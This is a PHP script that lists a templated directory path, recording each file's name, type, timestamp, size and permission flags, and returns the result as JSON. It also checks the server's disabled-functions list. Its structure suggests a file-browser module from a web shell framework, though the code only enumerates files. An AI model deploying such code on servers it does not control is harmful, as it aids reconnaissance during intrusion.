function function_existsEx($functionName){
    $d = explode(",", @ini_get("disable_functions"));
    if (empty($d)) {
        $d = array();
    } else {
        $d = array_map('trim', array_map('strtolower', $d));
    }
    return function_exists($functionName) && is_callable($functionName) && !in_array(strtolower($functionName), $d);
}

function getFileEx($dir){
    $result = array();
    try {
        $filesystem = new DirectoryIterator($dir);
        $result["currentDir"] = $dir;
        $fileIndex = 0;
        foreach ($filesystem as $fileInfo) {
            if ($fileInfo->isDot()) continue;

            $fullPath = $fileInfo->getPathname(); 
            $fileName = $fileInfo->getFilename();

            $lineData = array();
            $lineData[] = $fileName;
            $lineData[] = $fileInfo->isFile() ? "1" : "0"; 
            $lineData[] = $fileInfo->getMTime() ? @date("Y-m-d H:i:s", $fileInfo->getMTime()) : "-"; 
            $lineData[] = $fileInfo->isFile() ? $fileInfo->getSize() : 0;
            $fr = ($fileInfo->isReadable() ? "R" : "-") . 
                  ($fileInfo->isWritable() ? "W" : "-") . 
                  ($fileInfo->isExecutable() ? "X" : "-");
            $lineData[] = $fr;

            $result[$fileIndex++] = $lineData;
        }
        $result["count"] = $fileIndex;
    } catch (Exception $e) {
        $result["errMsg"] = "Directory access denied or invalid: " . $e->getMessage();
    }
    return $result;
}

function getFileAtt() {
    $dirName = '{{dirName}}';
    $basePath = (strlen(trim($dirName)) > 0) ? trim($dirName) : str_replace('\\', '/', dirname(__FILE__));

    
    $path = rtrim($basePath, '/\\') . DIRECTORY_SEPARATOR;

    
    if (@is_file($basePath)) {
        
        $result = array();
        $fileName = basename($basePath);
        $fullPath = $basePath;

        $lineData = array();
        $lineData[] = $fileName;                              
        $lineData[] = "1";                                    
        $mtime = @filemtime($fullPath);
        $lineData[] = $mtime ? @date("Y-m-d H:i:s", $mtime) : "1970-01-01 00:00:00"; 
        $size = @filesize($fullPath);
        $lineData[] = $size !== false ? $size : 0;           
        $fr = (@is_readable($fullPath) ? "R" : "-") .
              (@is_writable($fullPath) ? "W" : "-") .
              (@is_executable($fullPath) ? "X" : "-");
        $lineData[] = $fr;                                   

        $result[0] = $lineData;
        $result["count"] = 1;
        $result["currentFile"] = $fullPath; 

        return $result;
    }

    
    
    if (!@is_dir($path) || !@is_readable($path)) {
        return array("errMsg" => "Path does not exist or permission denied: " . $basePath);
    }

    
    if (!function_existsEx("scandir") && !function_existsEx("scandirEx") && class_exists("DirectoryIterator")) {
        return getFileEx(rtrim($basePath, '/\\')); 
    }

    $allFiles = function_existsEx("scandirEx") ? @scandirEx($path) : @scandir($path);
    $result = array();
    $fileIndex = 0;

    if ($allFiles !== false && is_array($allFiles)) {
        $result["Dir"] = $path;

        foreach ($allFiles as $fileName) {
            if ($fileName == "." || $fileName == "..") continue;

            $fullPath = $path . $fileName; 

            if (!file_exists($fullPath)) continue;

            $lineData = array();
            $lineData[] = $fileName;
            $isFile = @is_file($fullPath);
            $lineData[] = $isFile ? "1" : "0";

            $mtime = @filemtime($fullPath);
            $lineData[] = $mtime ? @date("Y-m-d H:i:s", $mtime) : "1970-01-01 00:00:00";

            $size = $isFile ? @filesize($fullPath) : 0;
            $lineData[] = $size !== false ? $size : 0;

            $fr = (@is_readable($fullPath) ? "R" : "-") .
                  (@is_writable($fullPath) ? "W" : "-") .
                  (@is_executable($fullPath) ? "X" : "-");
            $lineData[] = $fr;

            $result[$fileIndex++] = $lineData;
        }
        $result["count"] = $fileIndex;
    } else {
        $result["errMsg"] = "Unable to read directory: " . $path;
    }

    return $result;
}

$result=json_encode(getFileAtt());
return $result;

